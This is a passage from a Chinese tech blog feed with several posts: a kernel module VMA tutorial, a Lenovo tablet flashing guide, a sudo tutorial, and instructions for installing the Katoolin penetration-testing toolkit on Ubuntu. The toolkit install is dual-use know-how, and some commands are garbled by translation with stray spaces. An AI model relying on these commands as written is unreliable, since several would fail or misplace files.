class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  pr_info(<span class="string">"Module exit\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(vma_init);</span><br><span class="line">module_exit(vma_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Yu"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"vma test"</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码中:</p><p>38-52 行是内核模块初始化函数 vma_init；</p><p>40-46 行目的是获取 pid，可在加载模块时可传递相关参数（即进程 pid）；如果没有传递参数，则使用当前进程，即执行 insmod 命令的进程；</p><p>45 行 pid_task()函数为获取任务的任务描述符信息，其返回值是 struct task_struct 结构体类型的变量；</p><p>50 行调用自定义的 printit()函数打印相关信息；</p><p>9-34 行是本实验核心函数；</p><p>16 行获取待检查进程的内存描述符 struct mm_struct 数据结构，该结构由struct task_struct 中的*mm 指向；</p><p>18 行获取 VMA 链表头，即 mm-&gt;mmap；</p><p>21 行开始遍历 VMA 链表,down_read()函数用于申请读信号量，因本程序只是读取 VMA 链表，所以申请读者类型即可，若需丢 VMA 链表进行修改，则需申请写者类型信号量；  </p><p>24-32 行遍历 VMA 链表，并对每个 VMA 打印其起始地址、终止地址和长度信<br>息；</p><p>33 行释放读者信号量。</p></blockquote><ol start="2"><li><h5 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h5><p>编写 Makefile 文件，文件名必须为“Makefile”  </p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m := vma_test.o</span><br><span class="line"></span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></tbody></table></figure></li><li><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>   使用 make 命令编译即可。  </p></li><li><h5 id="插入模块"><a href="#插入模块" class="headerlink" title="插入模块"></a>插入模块</h5><p>   先通过 top 命令查看进程，任意获取一个进程 pid，如图所示，  本例中获取apache2 进程的 pid 3509。  </p><p>   <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/33535/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvQXpOUkdQdmVUalpCWGY0LnBuZw" alt="image-20200608163648953"></p><p>   使 用 insmod 插 入 模 块 ， 并 传 参 。 如 图 所 示 ， 本 例 中 模 块 名 为“vma_test.ko”,pid 为 3509，则插入模块命令为：  </p></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod vma_test.ko pid=3509</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li><h5 id="查看程序打印信息"><a href="#查看程序打印信息" class="headerlink" title="查看程序打印信息"></a>查看程序打印信息</h5><p>通过 dmesg 命令查看 VMA 信息。如下图所示:</p></li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/33535/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvTWsxRTlnaFN3ajRQdjhVLnBuZw" alt="image-20200608164250039"></p><blockquote><p>从上图可看到 apache2 进程包含许多 VMA 区域，以第一个 VMA 区域为例，其起始地址为 0x564af2e3a000,结束地址为 564af2ed7000,长度为 643072 字节。  </p></blockquote><pre><code>如下图所示为从 proc 虚拟文件系统中查看相应进程第一个 VMA 的完整信息。  </code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/33535/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvb3NlejFpcmhMNHFRV2Z3LnBuZw" alt="image-20200608164609038"></p><blockquote><p>从以上两图中内容对比可知，本程序输出信息正确。  </p></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>联想 Lenovo Tab3 10 Business TB3-X70F （国际版）线刷</title>
      
      
      <link href="/cn/posts/13741/"/>
      
      
      <url>/cn/posts/13741/</url>
      
      
        
      <content type="html"><![CDATA[<p>本文介绍将联想 Lenovo Tab3 10 Business TB3-X70F 刷成国际版的方法，或者可用此方法破解学习平板定制机</p><h3 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h3><p>1.下载工具包<br>链接：<a href="https://pan.baidu.com/s/155ta-glHLtbTmAGWHo1HrQ">https://pan.baidu.com/s/155ta-glHLtbTmAGWHo1HrQ</a><br>提取码：rfy4</p><p>2.安装驱动<br><a href="https://www.androidfilehost.com/?fid=24591000424943663">https://www.androidfilehost.com/?fid=24591000424943663</a><br>3.解压MediaTek SP Flash Tool和线刷包<br>4.管理员运行MediaTek SP Flash Tool<br>5.选择Download Only<br>6.线刷包里的scatter file，然后点Download<br>7.平板关机<br>8.按住音量加键的同时插入usb到电脑<br>9.当进度条变红开始刷机，当显示ok的时候刷机结束，重启即可。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/13741/20200606115349908.png" alt="在这里插入图片描述"></p><h3 id="English"><a href="#English" class="headerlink" title="English"></a>English</h3><p>1.Install MediaTek Preloader USB VCOM driver <a href="https://www.androidfilehost.com/?fid=24591000424943663">https://www.androidfilehost.com/?fid=24591000424943663</a></p><blockquote><p>Most importantly the Preloader USB VCOM driver that is essential for getting<br>the SmartPhone Flash Tool (SPFT) to work.</p><p>Contents:</p><p>Android\android_winusb.inf<br>Installs ADB (Android Debug Bridge, “USB-Debugging”) driver for<br>MediaTek’s vendor ID (VID_0E8D).<br>Optional. Your Android device might use a different vender ID anyway,<br>so you should first try the vendor’s ADB driver, if available.</p><p>CDC\cdc-acm.inf<br>Installs VCOM (virtual serial port) driver.<br>Required for the SPFT!</p><p>tetherxp.inf<br>“RNDIS-over-USB host driver for Intenet Sharing”.<br>You probably don’t need this.</p><p>wpdmtp.inf<br>Media Transfer Protocol (MTP) driver for MediaTek’s vendor ID.<br>You probably don’t need this on modern operating systems.</p><p>To install any of these INF files, first extract this ZIP archive.</p><p>Then, for Windows 8 and 10:<br>Simply right-click any extracted INF file,<br>and select “Install” in the appearing context menu.</p><p>For Windows 7:</p><ul><li>Open the Windows Device Manager</li><li>In the “Action” menu, click “Add legacy hardware”</li><li>Click Next</li><li>Select “Install the hardware that I manually select from a list (Advanced)”</li><li>Click Next</li><li>In the list, select “Ports (COM &amp; LPT)”</li><li>Click Next</li><li>Click “Have Disk…”</li><li>Browse for the INF file, e.g. cdc-acm.inf</li><li>Select the driver you want to install, e.g. “MediaTek PreLoader USB VCOM (Android)”</li><li>If a new device appears in the Device Manager with a yellow warning triangle<br>and error code 10, just select it and delete it (delete key). But do NOT delete<br>the driver software.</li></ul></blockquote><p>2.Install MediaTek SP Flash Tool (SPFT)<br>3.Extract firmware archive<br>4.Start SPFT<br>5.Make sure “Download Only” mode is selected<br>6.Load scatter file from extracted firmware<br>6.SPFT should auto-load firmware and verify checksum<br>7.Optional: select DA_SWSEC.bin as Download Agent<br>8.Optional: remove checkbox from partitions you do not want to flash<br>9.Click the Download button in SPFT<br>10.Turn off tablet completely<br>11.Hold volume-UP key on tablet while connecting it to PC via USB<br>12.After a few seconds, SPFT should find tablet and start<br>13.Release volume-UP key and wait for flashing to finish</p><blockquote><p>Note: when you load a scatter file, there MUST be a valid preloader<br>in the same directory as the scatter file, or else an error will<br>occur when you start a download/flash. You can clear the checkbox of<br>the preloader, so that it won’t be flashed, but its “Location” field<br>must be filled.</p></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 运维 </tag>
        
            
            
        <tag> 刷机 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Linux 所有命令无法使用的解决方法</title>
      
      
      <link href="/cn/posts/36827/"/>
      
      
      <url>/cn/posts/36827/</url>
      
      
        
      <content type="html"><![CDATA[<p>这是由于环境变量设置出错导致的 解决方法： 直接在命令行中输入以下代码，然后回车</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></tbody></table></figure><p> 然后输入如下代码， 把错误的环境变量修正：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/profile</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>详解管理root用户权限的sudo服务程序</title>
      
      
      <link href="/cn/posts/48730/"/>
      
      
      <url>/cn/posts/48730/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>sudo 命令允许特权用户以 root 用户身份运行全部或部分命令，但是理解其能做什么和不能做什么很有帮助。</p></blockquote><p>在你想要使用超级权限临时运行一条命令时，<code>sudo</code> 命令非常方便，但是当它不能如你期望的工作时，你也会遇到一些麻烦。比如说你想在某些日志文件结尾添加一些重要的信息，你可能会尝试这样做：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog</span><br><span class="line">-bash: /var/log/somelog: Permission denied</span><br></pre></td></tr></tbody></table></figure><p>好吧，看起来你似乎需要一些额外的特权。一般来说，你不能使用你的用户账号向系统日志中写入东西。我们使用 <code>sudo</code> 再尝试一次吧。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> !!</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog</span><br><span class="line">-bash: /var/log/somelog: Permission denied</span><br></pre></td></tr></tbody></table></figure><p>嗯，它还是没有啥反应。我们来试点不同的吧。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="string">'echo "Important note" &gt;&gt; /var/log/somelog'</span></span><br><span class="line"><span class="built_in">sudo</span>: <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog: <span class="built_in">command</span> not found</span><br></pre></td></tr></tbody></table></figure><p>也可以查看：<a href="https://www.networkworld.com/article/3242170/linux/invaluable-tips-and-tricks-for-troubleshooting-linux.html">在 Linux 下排查故障的宝贵提示和技巧</a>。</p><h3 id="接下来该干什么？"><a href="#接下来该干什么？" class="headerlink" title="接下来该干什么？"></a>接下来该干什么？</h3><p>上面在执行完第一条命令后的回应显示，我们缺少向日志文件写入时必须的特权。第二次，我们使用 root 权限运行了第一次的命令，但是返回了一个“没有权限”的错误。第三次，我们把整个命令放在一个引号里面再运行了一遍，返回了一个“没有发现命令”的错误。所以，到底错在哪里了呢？</p><ul><li>第一条命令：没有 root 特权，你无法向这个日志中写入东西。</li><li>第二条命令：你的超级权限没有延伸到重定向。</li><li>第三条命令：<code>sudo</code> 不理解你用引号括起来的整个 “命令”。</li></ul><p>而且如果你的用户还未添加到 sudo 用户组的时候，如果尝试使用 <code>sudo</code>，你可能已经看到过像下面的这么一条错误了：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nemo is not in the sudoers file. This incident will be reported.</span><br></pre></td></tr></tbody></table></figure><h3 id="你可以做什么？"><a href="#你可以做什么？" class="headerlink" title="你可以做什么？"></a>你可以做什么？</h3><p>一个相当简单的选择就是使用 <code>sudo</code> 命令暂时成为 root。鉴于你已经有了 sudo 特权，你可以使用下面的命令执行此操作：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> su</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> nemo:</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>注意这个改变的提示符表明了你的新身份。然后你就可以以 root 运行之前的命令了：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo "Important note" &gt;&gt; /var/log/somelog</span></span><br></pre></td></tr></tbody></table></figure><p>接着你可以输入 <code>^d</code> 返回你之前的身份。当然了，一些 sudo 的配置可能会阻止你使用 <code>sudo</code> 命令成为 root。</p><p>另一个切换用户为 root 的方法是仅用 <code>su</code> 命令，但是这需要你知道 root 密码。许多人被赋予了访问 sudo 的权限，而并不知道 root 密码，所以这并不是总是可行。</p><p>（采用 su 直接）切换到 root 之后，你就可以以 root 的身份运行任何你想执行的命令了。这种方式的问题是：1) 每个想要使用 root 特权的人都需要事先知道 root 的密码（这样不很安全）；2) 如果在运行需要 root 权限的特定命令后未能退出特权状态，你的系统可能会受到一些重大错误的波及。<code>sudo</code> 命令旨在允许您仅在真正需要时使用 root 权限，并控制每个 sudo 用户应具有的 root 权限。它也可以使你在使用完 root 特权之后轻松地回到普通用户的状态。</p><p>另外请注意，整个讨论的前提是你可以正常地访问 sudo，并且你的访问权限没有受限。详细的内容后面会介绍到。</p><p>还有一个选择就是使用一个不同的命令。如果通过编辑文件从而在其后添加内容是一种选择的话，你也许可以使用 <code>sudo vi /var/log/somelog</code>，虽然编辑一个活跃的日志文件通常不是一个好主意，因为系统可能会频繁的向这个文件中进行写入操作。</p><p>最后一个但是有点复杂的选择是，使用下列命令之一可以解决我们之前看到的问题，但是它们涉及到了很多复杂的语法。第一个命令允许你在得到 “没有权限” 的拒绝之后可以使用 <code>!!</code> 重复你的命令：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> <span class="built_in">echo</span> <span class="string">"Important note"</span> &gt;&gt; /var/log/somelog</span><br><span class="line">-bash: /var/log/somelog: Permission denied</span><br><span class="line">$ !!:gs/&gt;/|<span class="built_in">sudo</span> <span class="built_in">tee</span> -a /    &lt;=====</span><br><span class="line">$ <span class="built_in">tail</span> -1 /var/log/somelog</span><br><span class="line">Important note</span><br></pre></td></tr></tbody></table></figure><p>第二种是通过 <code>sudo</code> 命令，把你想要添加的信息传递给 <code>tee</code>。注意，<code>-a</code> 指定了你要<strong>附加</strong>文本到目标文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo "Important note" | sudo tee -a /var/log/somelog</span><br><span class="line">$ tail -1 /var/log/somelog</span><br><span class="line">Important note</span><br></pre></td></tr></tbody></table></figure><h3 id="sudo-有多可控？"><a href="#sudo-有多可控？" class="headerlink" title="sudo 有多可控？"></a>sudo 有多可控？</h3><p>回答这个问题最快速的回答就是，它取决于管理它的人。大多数 Linux 的默认设置都非常简单。如果一个用户被安排到了一个特别的组中，例如 <code>wheel</code> 或者 <code>admin</code> 组，那这个用户无需知道 root 的密码就可以拥有运行任何命令的能力。这就是大多数 Linux 系统中的默认设置。一旦在 <code>/etc/group</code> 中添加了一个用户到了特权组中，这个用户就可以以 root 的权力运行任何命令。另一方面，可以配置 sudo，以便一些用户只能够以 root 身份运行单一指令或者一组命令中的任何一个。</p><p>如果把像下面展示的这些行添加到了 <code>/etc/sudoers</code> 文件中，例如 “nemo” 这个用户可以以 root 身份运行 <code>whoami</code> 命令。在现实中，这可能不会造成任何影响，它非常适合作为一个例子。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># User alias specification</span><br><span class="line">nemo ALL=(root) NOPASSWD: WHOAMI</span><br><span class="line"># Cmnd alias specificationCmnd_Alias WHOAMI = /usr/bin/whoami</span><br></pre></td></tr></tbody></table></figure><p>注意，我们添加了一个命令别名（<code>Cmnd_Alias</code>），它指定了一个可以运行的命令的全路径，以及一个用户别名，允许这个用户无需密码就可以使用 <code>sudo</code> 执行的单个命令。</p><p>当 nemo 运行 <code>sudo whoami</code> 命令的时候，他将会看到这个：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo whoami</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure><p>注意这个，因为 nemo 使用 <code>sudo</code> 执行了这条命令，<code>whoami</code> 会显示该命令运行时的用户是 <code>root</code>。</p><p>至于其他的命令，nemo 将会看到像这样的一些内容：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo date</span><br><span class="line">[sudo] password for nemo:</span><br><span class="line">Sorry, user nemo is not allowed to execute '/bin/date' as root on butterfly.</span><br></pre></td></tr></tbody></table></figure><h3 id="sudo-的默认设置"><a href="#sudo-的默认设置" class="headerlink" title="sudo 的默认设置"></a>sudo 的默认设置</h3><p>在默认路径中，我们会利用像下面展示的 <code>/etc/sudoers</code> 文件中的几行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo egrep "admin|sudo" /etc/sudoers</span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL=(ALL) ALL        &lt;=====</span><br><span class="line"># Allow members of group sudo to execute any command</span><br><span class="line">%sudo ALL=(ALL:ALL) ALL     &lt;=====</span><br></pre></td></tr></tbody></table></figure><p>在这几行中，<code>%admin</code> 和 <code>%sudo</code> 都说明了任何添加到这些组中的人都可以使用 <code>sudo</code> 命令以 root 的身份运行任何命令。</p><p>下面列出的是 <code>/etc/group</code> 中的一行，它意味着每一个在该组中列出的成员，都拥有了 sudo 特权，而无需在 <code>/etc/sudoers</code> 中进行任何修改。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo:x:27:shs,nemo</span><br></pre></td></tr></tbody></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>sudo</code> 命令意味着你可以根据需要轻松地部署超级用户的访问权限，而且只有在需要的时候才能赋予用户非常有限的特权访问权限。你可能会遇到一些与简单的 <code>sudo command</code> 不同的问题，不过在 <code>sudo</code> 的回应中应该会显示你遇到了什么问题。</p><hr><p>来自<a href="https://linux.cn/article-10310-1.html">https://linux.cn/article-10310-1.html</a></p><p>via: <a href="https://www.networkworld.com/article/3322504/linux/selectively-deploying-your-superpowers-on-linux.html">https://www.networkworld.com/article/3322504/linux/selectively-deploying-your-superpowers-on-linux.html</a></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>在Ubuntu中使用Katoolin安装Kali Linux Tools</title>
      
      
      <link href="/cn/posts/50854/"/>
      
      
      <url>/cn/posts/50854/</url>
      
      
        
      <content type="html"><![CDATA[<p>本文将引导您逐步在Ubuntu中使用Katoolin安装Kali Linux Tools。对于那些不知道的人，<strong>Katoolin</strong>是一个Python脚本，可用于一次安装所有Kali Linux工具或手动一次安装。Kali Linux具有300多种渗透测试工具。除了安装所有工具，您还可以使用Katoolin在Linux框中仅安装您选择的选择性工具。如果您想在Ubuntu或任何其他基于DEB的系统上尝试使用Kali Linux工具，则应该尝试一下Katoolin。它将在您的Ubuntu系统中添加Kali Linux存储库，以便您可以一次安装所有渗透测试工具，也可以仅安装必要的工具。Katoolin是完全免费的开源软件，并已在基于Debian的系统上经过正式测试。</p><h2 id="在Ubuntu-18-04-LTS中安装Katoolin"><a href="#在Ubuntu-18-04-LTS中安装Katoolin" class="headerlink" title="在Ubuntu 18.04 LTS中安装Katoolin"></a>在Ubuntu 18.04 LTS中安装Katoolin</h2><p>我已经在Ubuntu 18.04 LTS服务器版本中测试了Katoolin。但是，它应该可以在其他Ubuntu版本和派生版本上使用。</p><p>确保在Ubuntu系统中安装了以下先决条件。</p><ul><li>Python 2.7</li><li>Git</li></ul><p>这些软件包在Ubuntu的默认源中可用，因此您可以使用apt软件包管理器进行安装。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python git</span><br></pre></td></tr></tbody></table></figure><p>另外，请确保已启用**[Universe]**源。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository Universe</span><br></pre></td></tr></tbody></table></figure><p>这是我的测试机详细信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 18.04.3 LTS</span><br><span class="line">Release:18.04</span><br><span class="line">Codename:bionic</span><br><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$ python -V</span><br><span class="line">Python 2.7.15+</span><br><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$ git --version</span><br><span class="line">git version 2.17.1</span><br><span class="line">cuiqingwei@Gary-Aspire-4739:/usr/bin$</span><br></pre></td></tr></tbody></table></figure><p>python和git版本</p><p>好吧，我们已经准备就绪。安装必备组件后，如下所示安装Katoolin：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/LionSec/katoolin.git</span><br></pre></td></tr></tbody></table></figure><p>上面的命令会将katoolin存储库克隆到当前工作目录中名为<strong>“ katoolin”</strong>的文件夹中。</p><p>接下来，将Katoolin二进制文件复制到您的路径，例如**/ usr / bin /**，如下所示。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cp katoolin / katoolin.py / usr / bin / katoolin</span><br></pre></td></tr></tbody></table></figure><p>最后，将Katoolin二进制文件设置为可执行文件：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chmod + x / usr / bin / katoolin</span><br></pre></td></tr></tbody></table></figure><p>现在，我们已经安装了Katoolin。让我们继续前进，看看如何使用它。</p><h2 id="使用Katoolin安装Kali-Linux-Tools"><a href="#使用Katoolin安装Kali-Linux-Tools" class="headerlink" title="使用Katoolin安装Kali Linux Tools"></a>使用Katoolin安装Kali Linux Tools</h2><p>所有命令都应以root用户或<strong>sudo</strong>特权运行。</p><p>要启动Katoolin，请运行以下命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo katoolin</span><br></pre></td></tr></tbody></table></figure><p>这就是katoolin命令行界面的样子。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> $$\   $$\             $$\                         $$\ $$\           </span><br><span class="line"> $$ | $$  |            $$ |                        $$ |\__|          </span><br><span class="line"> $$ |$$  /  $$$$$$\  $$$$$$\    $$$$$$\   $$$$$$\  $$ |$$\ $$$$$$$\  </span><br><span class="line"> $$$$$  /   \____$$\ \_$$  _|  $$  __$$\ $$  __$$\ $$ |$$ |$$  __$$\ </span><br><span class="line"> $$  $$&lt;    $$$$$$$ |  Kali linux tools installer |$$ |$$ |$$ |  $$ |</span><br><span class="line"> $$ |\$$\  $$  __$$ |  $$ |$$\ $$ |  $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |</span><br><span class="line"> $$ | \$$\ \$$$$$$$ |  \$$$$  |\$$$$$$  |\$$$$$$  |$$ |$$ |$$ |  $$ |</span><br><span class="line"> \__|  \__| \_______|   \____/  \______/  \______/ \__|\__|\__|  \__| V2.0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> + -- -- +=[ Author: LionSec | Homepage: www.neodrix.com</span><br><span class="line"> + -- -- +=[ 331 Tools </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[W] Before updating your system , please remove all Kali-linux repositories to avoid any kind of problem .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line">kat &gt;</span><br></pre></td></tr></tbody></table></figure><p>启动Katoolin</p><p>如上所示，Katoolin主界面有四个选项。输入数字以打开相应的子菜单。让我们一一看。</p><h3 id="1-添加Kali存储库并更新"><a href="#1-添加Kali存储库并更新" class="headerlink" title="1.添加Kali存储库并更新"></a>1.添加Kali存储库并更新</h3><p>该选项使您可以将kali Linux存储库添加到Linux系统。为此，请键入 <strong>1</strong>（数字1）以添加存储库。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) Add Kali repositories &amp; Update </span><br><span class="line">2) View Categories</span><br><span class="line">3) Install classicmenu indicator</span><br><span class="line">4) Install Kali menu</span><br><span class="line">5) Help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kat &gt; 1</span><br></pre></td></tr></tbody></table></figure><p>添加Kali存储库</p><p>将打开一个子菜单。再次输入<strong>1</strong>以添加Kali-linux存储库。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kat &gt; 1</span><br><span class="line"></span><br><span class="line">1) Add kali linux repositories</span><br><span class="line">2) Update</span><br><span class="line">3) Remove all kali linux repositories</span><br><span class="line">4) View the contents of sources.list file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">What do you want to do ?&gt; 1</span><br></pre></td></tr></tbody></table></figure><p>然后，键入<strong>2</strong>以更新存储库：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Executing: /tmp/apt-key-gpghome.MvaSscaYwv/gpg.1.sh --keyserver pool.sks-keyservers.net --recv-keys ED444FF07D8D0BF6</span><br><span class="line">gpg: connecting dirmngr at '/tmp/apt-key-gpghome.MvaSscaYwv/S.dirmngr' failed: IPC connect call failed</span><br><span class="line">gpg: keyserver receive failed: No dirmngr</span><br><span class="line"></span><br><span 